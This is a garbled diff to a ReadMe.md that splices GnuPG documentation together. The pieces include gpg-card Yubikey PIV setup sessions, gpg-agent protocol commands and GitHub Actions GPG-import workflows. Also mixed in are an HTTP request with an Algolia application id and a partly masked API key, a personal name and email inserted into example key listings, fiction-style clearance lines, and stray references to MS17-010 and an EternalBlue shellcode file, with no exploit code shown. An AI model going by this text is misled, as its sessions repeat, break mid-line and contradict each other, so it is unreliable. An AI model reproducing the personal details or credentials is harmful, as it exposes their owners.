+   (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
+   (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr)
+Your selection? 4
+Please specify how long the key should be valid.
+         0 = key does not expire
+      <n>  = key expires in n days
+      <n>w = key expires in n weeks
+      <n>m = key expires in n months
+      <n>y = key expires in n years
+Key is valid for? (0)
+Key does not expire at all
+Is this correct? (y/N) y
+Really create? (y/N) y
+
+sec  rsa2048/C3AFA9ED971BB365
+     created: 2019-04-04  expires: never       usage: SC
+     card-no: FF020001008A77C1
+     trust: ultimate      validity: ultimate
+ssb  rsa2048/7067860A98FCE6E1
+     created: 2019-04-04  expires: never       usage: E
+     card-no: FF020001008A77C1
+[ultimate] (1). otto@example.net
+
+gpg> save
+Now you can use your PIV card also with gpg.
+


diff --git a/ReadMe.md b/ReadMe.md
index 7278f80..41b298d 100644
--- a/ReadMe.md
+++ b/ReadMe.md
@@ -709,7 +709,844 @@ Digital signature’ key
 gpg-card:
 
 gpg/card> writecert PIV.9C < sign.crt
+# MS17-010
+# 000006
+Reader ...........: 1050:0407:X:0
+Card type ........: yubikey
+Card firmware ....: 5.1.2
+Serial number ....: FF020001008A77C1
+Application type .: PIV
+Version ..........: 1.0
+Displayed s/n ....: yk-9074625
+PIN usage policy .: app-pin
+PIN retry counter : - [verified] -
+PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
+      keyref .....: PIV.9A  (auth)
+      algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C
+      keyref .....: PIV.9E  (auth)
+      algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED
+      keyref .....: PIV.9C  (sign,cert)
+      algorithm ..: rsa2048
+      used for ...: X.509
+        user id ..: CN=Signing key for yk-9074625,O=example,C=DE
+        user id ..: <6309304695z@gmail.co
+ m>
+Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB
+      keyref .....: PIV.9D  (encr)
+      algorithm ..: rsa2048
+      used for ...: X.509
+        user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
+        user id ..: <6309304695z@gmail.com>
+ PIV authentication’ key with ssh:
+
+$ ssh-add -l
+384 SHA256:0qnJ0Y0ehWxKcx2frLfEljf6GCdlO55OZed5HqGHsaU cardno:yk-9074625 (ECDSA)
+ssh-add with the uppercase ‘-L
+$ gpgsm --learn
+$ gpg --full-gen-key
+Please select what kind of key you want:
+   (1) RSA and RSA (default)
+   (2) DSA and Elgamal
+   (3) DSA (sign only)
+   (4) RSA (sign only)
+  (14) Existing key from card
+Your selection? 14
+Serial number of the card: FF020001008A77C1
+Available keys:
+   (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
+   (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
+   (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
+   (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr)
+Your selection? 3
+Please specify how long the key should be valid.
+         0 = key does not expire
+      <n>  = key expires in n days
+      <n>w = key expires in n weeks
+      <n>m = key expires in n months
+      <n>y = key expires in n years
+Key is valid for? (0)
+Key does not expire at all
+Is this correct? (y/N) y
+
+GnuPG needs to construct a user ID to identify your key.
+
+Real name: keith bieszczat
+Email address: 6309304695z@gmail.com
+Comment: https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator
+You selected this USER-ID:
+    "6309304695z@gmail.com"
+
+Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o
+gpg: key C3AFA9ED971BB365 marked as ultimately trusted
+gpg: revocation certificate stored as '[...]D971BB365.rev'
+public and secret key created and signed.
+
+Note that this key cannot be used for encryption.  You may want to use
+the command "--edit-key" to generate a subkey for this purpose.
+pub   rsa2048 2019-04-04 [SC]
+      7F899AE2FB73159DD68A1B20C3AFA9ED971BB365
+uid                      6309304695z@gmail.com
+
+ run gpg in --expert mode
+ $ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365
+Secret key is available.
+
+sec  rsa2048/C3AFA9ED971BB365
+     created: 2019-04-04  expires: never       usage: SC
+     card-no: FF020001008A77C1
+     trust: ultimate      validity: ultimate
+[ultimate] (1). otto@example.net
+gpg> addkey
+Secret parts of primary key are stored on-card.
+Please select what kind of key you want:
+   (3) DSA (sign only)
+   (4) RSA (sign only)
+   (5) Elgamal (encrypt only)
+   (6) RSA (encrypt only)
+  (14) Existing key from card
+Your selection? 14
+Serial number of the card: FF020001008A77C1
+Available keys:
+   (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
+   (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
+   (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
+   (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr)
+Your selection? 4
+Please specify how long the key should be valid.
+         0 = key does not expire
+      <n>  = key expires in n days
+      <n>w = key expires in n weeks
+      <n>m = key expires in n months
+      <n>y = key expires in n years
+Key is valid for? (0)
+Key does not expire at all
+Is this correct? (y/N) y
+Really create? (y/N) y
+
+sec  rsa2048/C3AFA9ED971BB365
+     created: 2019-04-04  expires: never       usage: SC
+     card-no: FF020001008A77C1
+     trust: ultimate      validity: ultimate
+ssb  rsa2048/7067860A98FCE6E1
+     created: 2019-04-04  expires: never       usage: E
+     card-no: FF020001008A77C1
+[ultimate] (1). otto@example.net
+
+gpg> save
+ 
+/* 32A19-D90712   
+LEVEL-5 CLEARANCE ONLY
+ ‘--force’
+authentication key 
+-header-'010203040506070801020304050607080102030405060708'
+SETDATA hexstring
+to tell scdaemon about the data to be signed. The data must be given in hex notation. The actual signing is done using the command
+
+  PKSIGN keyid
+where keyid is the hexified ID of the key to be used. The key id may have been retrieved using the command LEARN. If another hash algorithm than SHA-1 is used, that algorithm may be given like:
+
+  PKSIGN --hash=algoname keyid
+READKEY hexified_certid
+READCERT hexified_certid|keyid
+SERIALNO
+Return the serial number of the card using a status response like:
+
+  S SERIALNO D27600000000000000000000
+ WRITEKEY [--force] keyid
+SETDATA hexstring
+to tell scdaemon about the data to be decrypted. The data must be given in hex notation. The actual decryption is then done using the command
+
+  PKDECRYPT keyid
+CHECKPIN idstr
+RESTART
+APDU [--atr] [--more] [--exlen[=n]] [hexstring]
+S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1
+
+./configure --sysconfdir=/etc --localstatedir=/va
+CN=Wurzel ZS 3,O=Intevation GmbH,C=DE
+  A6935DD34EF3087973C706FC311AA2CCF733765B S
+
+  # CN=PCA-1-Verwaltung-02/O=PKI-1-Verwaltung/C=DE
+  DC:BD:69:25:48:BD:BB:7E:31:6E:BB:80:D3:00:80:35:D4:F8:A6:CD S
+
+  # CN=Root-CA/O=Schlapphuete/L=Pullach/C=DE
+  !14:56:98:D3:FE:9C:CA:5A:31:6E:BC:81:D3:11:4E:00:90:A3:44:C2 S
+  
+       # Key added on: 2011-07-20 20:38:46
+       # Fingerprint:  5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81
+       34B62F25E277CF13D3C6BCEBFD3F85D08F0A864B 0 confirm
+private-keys-v1.d/
+gpg-connect-agent 'help COMMAND' /bye
+SETKEY <keyGrip>
+Tell the server about the key to be used for decryption. If this is not used, gpg-agent may try to figure out the key by trying to decrypt the message with each key available.
+
+  PKDECRYPT
+The agent checks whether this command is allowed and then does an INQUIRY to get the ciphertext the client should then send the cipher text.
+
+    S: INQUIRE CIPHERTEXT
+    C: D (xxxxxx
+    C: D xxxx)
+    C: END
+Please note that the server may send status info lines while reading the data lines from the client. The data send is a SPKI like S-Exp with this structure:
+
+     (enc-val
+       (<algo>
+         (<param_name1> <mpi>)
+     ...
+         (<param_namen> <mpi>)))
+Where algo is a string with the name of the algorithm; see the libgcrypt documentation for a list of valid algorithms. The number and names of the parameters depend on the algorithm. The agent does return an error if there is an inconsistency.
+
+If the decryption was successful the decrypted data is returned by means of "D" lines.
+
+Here is an example session:
+
+   C: PKDECRYPT
+   S: INQUIRE CIPHERTEXT
+   C: D (enc-val elg (a 349324324)
+   C: D    (b 3F444677CA)))
+   C: END
+   S: # session key follows
+   S: S PADDING 0
+   S: D (value 1234567890ABCDEF0)
+   S: OK decryption successful
+The “PADDING” status line is only send if gpg-agent can tell what kind of padding is used. As of now only the value 0 is used to indicate that the padding has
+SIGKEY <keyGrip>
+This can be used multiple times to create multiple signature, the list of keys is reset with the next PKSIGN command or a RESET. The server tests whether the key is a valid key to sign something and responds with okay.
+
+   SETHASH --hash=<name>|<algo> <hexstring>
+sig-val
+       (<algo>
+         (<param_name1> <mpi>)
+     ...
+         (<param_namen> <mpi>)))
+The operation is affected by the option
+
+   OPTION use-cache-for-signing=0|1
+The default of 1 uses the cache. Setting this option to 0 will lead gpg-agent to ignore the passphrase cache. Note, that there is also a global command line option for gpg-agent to globally disable the caching.
+
+Here is an example session:
+
+   C: SIGKEY <keyGrip>
+   S: OK key available
+   C: SIGKEY <keyGrip>
+   S: OK key available
+   C: PKSIGN
+   S: # I did ask the user whether he really wants to sign
+   S: # I did ask the user for the passphrase
+   S: INQUIRE HASHVAL
+   C: D ABCDEF012345678901234
+   C: END
+   S: # signature follows
+   S: D (sig-val rsa (s 45435453654612121212))
+   S: OK
+  GENKEY [--no-protection] [--preset] [<cache_nonce>]
+Invokes the key generation process and the server will then inquire on the generation parameters, like:
+
+   S: INQUIRE KEYPARM
+   C: D (genkey (rsa (nbits  1024)))
+   C: END
+The format of the key parameters which depends on the algorithm is of the form:
+
+    (genkey
+      (algo
+        (parameter_name_1 ....)
+          ....
+        (parameter_name_n ....)))
+If everything succeeds, the server returns the *public key* in a SPKI like S-Expression like this:
+
+     (public-key
+       (rsa
+   (n <mpi>)
+   (e <mpi>)))
+Here is an example session:
+
+   C: GENKEY
+   S: INQUIRE KEYPARM
+   C: D (genkey (rsa (nbits  1024)))
+   C: END
+   S: D (public-key
+   S: D   (rsa (n 326487324683264) (e 10001)))
+   S  OK key created
+    ISTRUSTED <5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81>
+LISTTRUSTED
+GpgAgent returns a list of trusted keys line by line:
+
+    S: D 000000001234454556565656677878AF2F1ECCFF P
+    S: D 340387563485634856435645634856438576457A P
+    S: D FEDC6532453745367FD83474357495743757435D S
+    S: OK
+The first item on a line is the hexified fingerprint where MD5 fingerprints are 00 padded to the left and the second item is a flag to indicate the type of key (so that gpg is able to only take care of PGP keys). P = OpenPGP, S = S/MIME. A client should ignore the rest of the line, so that we can extend the format in the future.
+Ok
+Finally a client should be able to mark a key as trusted:
+
+   MARKTRUSTED fingerprint "P"|"S"
+The server will then pop up a window to ask the user whether she really trusts this key. For this it will probably ask for a text to be displayed like this:
+
+   S: INQUIRE TRUSTDESC
+   C: D Do you trust the key with the fingerprint @FPR@
+   C: D bla fasel blurb.
+   C: END
+   S: OK
+GET_PASSPHRASE [--data] [--check] [--no-ask] [--repeat[=N]] \
+                 [--qualitybar] cache_id                \
+                 [error_message prompt description]
+PRESET_PASSPHRASE [--inquire] <string_or_keygrip> <timeout> [<hexstring>]
+
+HAVEKEY keygrips
+  GET_CONFIRMATION description
+  LEARN [--send]
+UPDATESTARTUPTTY
+SETDATA hexstring
+
+
+  PKSIGN keyid
+
+
+  PKSIGN --hash=algoname keyid
+
+READCERT hexified_certid|keyid
+READKEY hexified_certid
+SETDATA hexstring
+d
+
+  PKSIGN keyid
+ LEARN
+
+  PKSIGN --hash=algoname keyid
+
+WRITEKEY [--force] keyid
+WRITEKEY [--force] keyid
+PASSWD [--reset] [--nullpin] chvno
+CHECKPIN idstr
+APDU [--atr] [--more] [--exlen[=n]] [hexstring]
+this:
+
+     S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1
+--auto-key-import 
+
+command --locate-external-key
+command --locate-external-key
+github/workflows/release.yml:
+ldap://keys.(thedomain)
+‘--auto-key-locate
+ --auto-key-locate
+--auto-key-retrieve
+
+
+ honor-keyserver-url 
+
+-sig-keyserver-url
+--recv-key
+honor-keyserver-url
+--use-agent
+--gpg-agent-info
+
+
+--no-random-seed-file
+Host: c7-use-3.algolianet. com
+Accept: */*
+Sec-Fetch-Site: cross-site
+Accept-Language: en-US, en; q=0.9
+Accept-Encoding: gzip, deflate, br
+Sec-Fetch-Mode: cors x-algolia-application-id: A7KCVJZ91B
+Origin: https://dashboard.algolia.com
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone 0S 17_3 like Mac 0S X) AppleWe
+x-algolia-api-key: b3cf*************************米**
+Content-Length: 27
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Sec-Fetch-Dest: empty
+
+scdaemon.conf
+1
+HKCU\Software\GNU\GnuPG:DefaultLogFile,
+--debug-level level
+HKCU\Software\GNU\GnuPG:DefaultLogFile,
+scd-event
+HKCU\Software\GNU\GnuPG:HomeDir
+HKCU\Software\GNU\GnuPG:DefaultLogFile,
+reader_n.status
+HKCU\Software\GNU\GnuPG:HomeDir
+
+trustlist.txt file
+gpg-agent.conf
+HKCU\Software\GNU\GnuPG:HomeDir
+name: release
+debug-pinentry 
+--debug 1024
+
+global trustlist (/usr/local/etc/gnupg/trustlist.tx
+
+Active cards
+Active cards (inserted into a card reader or plugged in tokens) are always tried; they are ordered by their serial numbers.
+gpg-connect-agent updatestartuptty /bye
+Although all GnuPG components try to start the gpg-agent as needed, this is not possible for the ssh support because ssh does not know about it. Thus if no GnuPG tool which accesses the agent has been run, there is no guarantee that ssh is able to use gpg-agent for authentication. To fix this you may start gpg-agent if needed using this simple command:
+
+gpg-connect-agent /bye
+--scdaemon-program filename
+Use program filename as the Smartcard daemon. The default is installation dependent and can be shown with the gpgconf
+--check-passphrase-pattern file
+--check-sym-passphrase-pattern file
+Check the passphrase against the pattern given in file. When entering a new passphrase matching one of these pattern a warning will be displayed. If file does not contain any slashes and does not start with "~/" it is searched in the system configuration directory (/usr/local/etc/gnupg)
+bin\pinentry.exe, ..\Gpg4win\bin\pinentry.exe, ..\Gpg4win\pinentry.exe, ..\GNU\GnuPG\pinentry.exe, ..\GNU\bin\pinentry.exe, bin\pinentry-basic.exe
+Keys listed in the sshcontrol file
+--disable-extended-key-format
+These options are obsolete and have no effect. The extended key format is used for years now and has been supported since 2.1.12. Existing keys in the old format are migrated to the new format as soon as they are touched.
+
+--enable-ssh-support
+--enable-win32-openssh-support
+--enable-putty-support
+
+gpg-connect-agent 'GETINFO s2k_count' /bye
+gpg-connect-agent 'GETINFO s2k_time' /bye
+To view the auto-calibrated count use:
+
+gpg-connect-agent 'GETINFO s2k_count_cal' /bye
+--ssh-fingerprint-digest
+Keys listed in the sshcontrol file
+
+Active card
+gpg-connect-agent /bye
+bashrc or whatever initialization file is used for all shell invocations:
+
+GPG_TTY=$(tty)
+export GPG_TTY
+--daemon [command line]
+server
+
+agent-program file ¶
+Specify the agent program to be started if none is running. The default value is determined by running gpgconf with the option --list-dirs.
+
+--gpg-program file
+Specify a non-default gpg binary to be used by certain commands.
+
+--gpgsm-program file
+Specify a non-default gpgsm binary to be used by certain commands.
+
+--chuid uid
+Change the current user to uid which may either be a number or a name. This can be used from the root account to run gpg-card for another user. If uid is not the current UID a standard PATH is set and the envvar GNUPGHOME is unset. To override the latter the option --homedir can be used. This option has only an effect when used on the command line. This option has currently no effect at all on Windows.
+
+gpg-card
+AUTHENTICATE [--setkey] [--raw] [< file]|010203040506070801020304050607080102030405060708] ¶
+AUTH
+FETCH
+GENERATE [--force] [--algo=algo{+algo2}] keyref
+KDF-SETUP ¶
+Prepare the OpenPGP card KDF feature for this card.
+
+LANG [--clear]
+Change the language info for the card. This info can be used by applications for a personalized greeting. Up to 4 two-digit language identifiers can be entered as a preference. The option --clear removes all identifiers. GnuPG does not use this info.
+
+LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app]
+NAME [--clear]
+PRIVATEDO [--clear] n [< file] file
+READCERT [--openpgp] certref > file ¶
+Read the certificate for key certref and store it in file. With option --openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3".
+URL [--clear]
+gpg's. --fetch 
+WRITECERT certref < file ¶
+WRITECERT --openpgp certref [< file|fpr]
+WRITECERT --clear certref
+ --openpgp
+file 
+fpr.
+WRITEKEY [--force] keyref keygrip ¶
+Write a private key object identified by keygrip to the card under the id keyref.
+CHECKKEYS [--ondisk] [--delete-clear-copy] [--delete-protected-copy] ¶
+Serial number
+A hex-string with the serial number of the card.
+
+Type
+This gives the type of the card’s application. For example "OpenPGP" or "PIV".
+
+Keygrip
+A hex-string identifying a key.
+
+Keyref
+The application slot where the key is stored on the card. For example "OpenPGP.1"
+
+Status
+The status of the key. The most common value is "shadowed" for a key where only the public key along with the card’s serial number is stored on the disk. The value "clear" indicates that a copy of the card’s key is stored unprotected on disk. The value "protected" indicated that a copy of the car’s key is stored on disk but is protected by a password. The value "error" may also be shown if there was a problem reading information from the card.
+
+YUBIKEY cmd args
+Various commands pertaining to Yubikey tokens with cmd being:
+
+LIST
+List supported and enabled Yubikey applications.
+
+ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all]
+DISABLE
+Enable or disable the specified or all applications on the given interface.
+
+The support for OpenPGP cards in gpg-card is not yet complete. For missing features, please continue to use gpg --card-edit.
+
+GnuPG has support for PIV cards (“Personal Identity Verification” as specified by NIST Special Publication 800-73-4). This section describes how to initialize (personalize) a fresh Yubikey token featuring the PIV application (requires Yubikey-5). We assume that the credentials have not yet been changed and thus are:
+
+Authentication key
+This is a 24 byte key described by the hex string
+010203040506070801020304050607080102030405060708.
+
+PIV Application PIN
+This is the string 123456.
+
+PIN Unblocking Key
+This is the string 12345678.
+list (the string gpg/card>
+card> list
+Reader ...........: 1050:0407:X:0
+Card type ........: yubikey
+Card firmware ....: 5.1.2
+Serial number ....: D2760001240102010006090746250000
+Application type .: OpenPGP
+Version ..........: 2.1
+[...]
+on:
+  push:
+    tags:
+      - "v*"
+
+permissions:
+  contents: write
+
+jobs:
+  release:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - uses: cli/gh-extension-precompile@v1
+        with:
+          go_version: "1.16"
+Then
+- uses: cli/gh-extension-precompile@v1
+  env:
+    CGO_ENABLED: 1
+- uses: cli/gh-extension-precompile@v1
+  with:
+    build_script_override: "script/build.sh"
+name: release
+
+on:
+  push:
+    tags:
+      - "v*"
+
+permissions:
+  contents: write
+
+jobs:
+  release:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - id: import_gpg
+        uses: crazy-max/ghaction-import-gpg@v5
+        with:
+          gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
+          passphrase: ${{ secrets.GPG_PASSPHRASE }}
+      - uses: cli/gh-extension-precompile@v1
+        with:
+          gpg_fingerprint: ${{ steps.import_gpg.outputs.fingerprint }}
+# macOS
+gpg --armor --export-secret-key joe@foo.bar | pbcopy
+
+# Ubuntu (assuming GNU base64)
+gpg --armor --export-secret-key joe@foo.bar -w0 | xclip
+
+# Arch
+gpg --armor --export-secret-key joe@foo.bar | xclip -selection clipboard -i
+
+# FreeBSD (assuming BSD base64)
+gpg --armor --export-secret-key joe@foo.bar | xclip
+
+name: import-gpg
+
+on:
+  push:
+    branches: master
+
+jobs:
+  import-gpg:
+    runs-on: ubuntu-latest
+    steps:
+      -
+        name: Checkout
+        uses: actions/checkout@v4
+      -
+        name: Import GPG key
+        uses: crazy-max/ghaction-import-gpg@v6
+        with:
+          gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
+          passphrase: ${{ secrets.PASSPHRASE }}
+      -
+        name: List keys
+        run: gpg -K
+name: import-gpg
+
+on:
+  push:
+    branches: master
 
+gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB
+gpg/card> writecert PIV.9D < encr.crt
+
+jobs:
+  import-gpg:
+    runs-on: ubuntu-latest
+    steps:
+      -
+        name: Checkout
+        uses: actions/checkout@v4
+      -
+        name: Import GPG key
+        uses: crazy-max/ghaction-import-gpg@v6
+        with:
+          gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
+          passphrase: ${{ secrets.PASSPHRASE }}
+          fingerprint: "C17D11ADF199F12A30A0910F1F80449BE0B08CB8"
+      -
+        name: List keys
+        run: gpg -K
+
+pub   ed25519 2021-09-24 [C]
+      87F257B89CE462100BEC0FFE6071D218380FDCC8
+      Keygrip = F5C3ABFAAB36B427FD98C4EDD0387E08EA1E8092
+uid           [ unknown] Joe Bar <joe@bar.foo>
+sub   ed25519 2021-09-24 [S]
+      C17D11ADF199F12A30A0910F1F80449BE0B08CB8
+      Keygrip = DEE0FC98F441519CA5DE5D79773CB29009695FEB
+name: import-gpg
+/.gnupg/scdaemon.conf and by restarting scdaemon, either by killing the process or by using gpgconf --kill scdaemon. Finally the default order in which card applications are tried by scdaemon can be changed. For example to prefer PIV over OpenPGP it is sufficient to add
+
+application-priority piv
+to ~/.gnupg/scdaemon.conf and to restart scdaemon. This has an effect only on tokens which support both, PIV and OpenPGP, but does not hamper the use of OpenPGP only tokens.
+
+With one of these methods employed the list command of gpg-card shows this:
+
+gpg/card> list
+Reader ...........: 1050:0407:X:0
+Card type ........: yubikey
+Card firmware ....: 5.1.2
+Serial number ....: FF020001008A77C1
+Application type .: PIV
+Version ..........: 1.0
+Displayed s/n ....: yk-9074625
+PIN usage policy .: app-pin
+PIN retry counter : - 3 -
+PIV authentication: [none]
+      keyref .....: PIV.9A
+Card authenticat. : [none]
+      keyref .....: PIV.9E
+Digital signature : [none]
+      keyref .....: PIV.9C
+Key management ...: [none]
+      keyref .....: PIV.9D
+34798AAFE0A7565088101CC4AE31C5C8C74461CB.key
+list --cards
+well. The PIV authentication key (internal reference PIV.9A
+Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D) is used for encryption
+
+gpg/card> auth 010203040506070801020304050607080102030405060708
+gpg/card> auth < myauth.key
+
+gpg/card> generate --algo=nistp384 PIV.9A
+PIV card no. yk-9074625 detected
+gpg/card> generate --algo=nistp256 PIV.9E
+PIV card no. yk-9074625 detected
+gpg/card> generate --algo=rsa2048 PIV.9C
+PIV card no. yk-9074625 detected
+ ‘--force’
+gpg/card> list
+Reader ...........: 1050:0407:X:0
+Card type ........: yubikey
+Card firmware ....: 5.1.2
+Serial number ....: FF020001008A77C1
+Application type .: PIV
+Version ..........: 1.0
+Displayed s/n ....: yk-9074625
+PIN usage policy .: app-pin
+PIN retry counter : - 3 -
+PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
+      keyref .....: PIV.9A  (auth)
+      algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C
+      keyref .....: PIV.9E  (auth)
+      algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED
+      keyref .....: PIV.9C  (sign,cert)
+      algorithm ..: rsa2048
+Key management ...: [none]
+      keyref .....: PIV.9D
+keygrip
+gpg
+self-signed X.509 certificate (exit the gpg-card tool, first):
+
+$ gpgsm --gen-key -o encr.crt
+   (1) RSA
+   (2) Existing key
+   (3) Existing key from card
+Your selection? 1
+What keysize do you want? (3072) 2048
+Requested keysize is 2048 bits
+Possible actions for a RSA key:
+   (1) sign, encrypt
+   (2) sign
+   (3) encrypt
+Your selection? 3
+Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE
+Enter email addresses (end with an empty line):
+> otto@example.net
+>
+Enter DNS names (optional; end with an empty line):
+>
+Enter URIs (optional; end with an empty line):
+>
+Create self-signed certificate? (y/N) y
+These parameters are used:
+    Key-Type: RSA
+    Key-Length: 2048
+    Key-Usage: encrypt
+    Serial: random
+    Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
+    Name-Email: otto@example.net
+
+Proceed with creation? (y/N)
+Now creating self-signed certificate.  This may take a while ...
+gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB
+gpgsm: certificate created
+Ready.
+$ gpgsm --import encr.crt
+gpgsm: certificate imported
+gpgsm: total number processed: 1
+gpgsm:               imported: 1
+gpg/card> list
+Reader ...........: 1050:0407:X:0
+Card type ........: yubikey
+Card firmware ....: 5.1.2
+Serial number ....: FF020001008A77C1
+Application type .: PIV
+Version ..........: 1.0
+Displayed s/n ....: yk-9074625
+PIN usage policy .: app-pin
+PIN retry counter : - 3 -
+PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
+      keyref .....: PIV.9A  (auth)
+      algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C
+      keyref .....: PIV.9E  (auth)
+      algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED
+      keyref .....: PIV.9C  (sign,cert)
+      algorithm ..: rsa2048
+Key management ...: [none]
+      keyref .....: PIV.9D
+keygrip 
+gpgsm --gen-key -o encr.crt
+   (1) RSA
+   (2) Existing key
+   (3) Existing key from card
+Your selection? 1
+What keysize do you want? (3072) 2048
+Requested keysize is 2048 bits
+Possible actions for a RSA key:
+   (1) sign, encrypt
+   (2) sign
+   (3) encrypt
+Your selection? 3
+Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE
+Enter email addresses (end with an empty line):
+> otto@example.net
+>
+Enter DNS names (optional; end with an empty line):
+>
+Enter URIs (optional; end with an empty line):
+>
+Create self-signed certificate? (y/N) y
+These parameters are used:
+    Key-Type: RSA
+    Key-Length: 2048
+    Key-Usage: encrypt
+    Serial: random
+    Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
+    Name-Email: otto@example.net
+
+Proceed with creation? (y/N)
+Now creating self-signed certificate.  This may take a while ...
+gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB
+gpgsm: certificate created
+Ready.
+$ gpgsm --import encr.crt
+gpgsm: certificate imported
+gpgsm: total number processed: 1
+gpgsm:               imported: 1
+
+gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB
+gpg/card> writecert PIV.9D < encr.crt
+
+gpgsm --with-keygrip -k 6309304695z@gmail.com
+Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB
+      keyref .....: PIV.9D  (encr)
+      algorithm ..: rsa2048
+      used for ...: X.509
+        user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
+        user id ..: <6309304695z@gmail.com>
+
+34798AAFE0A7565088101CC4AE31C5C8C74461CB.key
+
+$ gpgsm --learn
+$ gpgsm --gen-key -o sign.crt
+Please select what kind of key you want:
+   (1) RSA
+   (2) Existing key
+   (3) Existing key from card
+Your selection? 3
+Serial number of the card: FF020001008A77C1
+Available keys:
+   (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384
+   (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256
+   (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048
+   (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048
+Your selection? 3
+Possible actions for a RSA key:
+   (1) sign, encrypt
+   (2) sign
+   (3) encrypt
+Your selection? 2
+Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE
+Enter email addresses (end with an empty line):
+> 6309304695z@gmail.com
+>
+Enter DNS names (optional; end with an empty line):
+>
+Enter URIs (optional; end with an empty line):
+>
+Create self-signed certificate? (y/N)
+These parameters are used:
+    Key-Type: card:PIV.9C
+    Key-Length: 1024
+    Key-Usage: sign
+    Serial: random
+    Name-DN: CN=Signing key for yk-9074625,O=example,C=DE
+    Name-Email: 6309304695z@gmail.com
+
+Proceed with creation? (y/N) y
+Now creating self-signed certificate.  This may take a while ...
+gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED
+gpgsm: certificate created
+Ready.
+$ gpgsm --import sign.crt
+gpgsm: certificate imported
+gpgsm: total number processed: 1
+gpgsm:               imported: 1
+
+‘gpgsm --learn’
+Digital signature’ key
+gpg-card:010203040506070801020304050607080102030405060708
+
+shellcode/eternalblue_sc_merge.py
+
+gpg/card> writecert PIV.9C < sign.crt
 on:
   push:
     branches: master

AUTHENTICATE [--setkey] [--raw] [< file]|key]
AUTH and set key

GENERATE [--force] [--algo=algo{+algo2}] keyref
Create a new key on a card. Use --force to overwrite an existing key. Use "help" for algo to get a list of known algorithms. For OpenPGP cards several algos may be given. Note that the OpenPGP key generation is done interactively unless --algo or keyref

LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app] ¶
L

READCERT [--openpgp] certref > file ¶

openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3"

WRITECERT certref < file ¶
WRITECERT --openpgp certref [< file|fpr]
WRITECERT --clear certref
Write a certificate to the card under the id certref. 

WRITEKEY [--force] keyref keygrip ¶
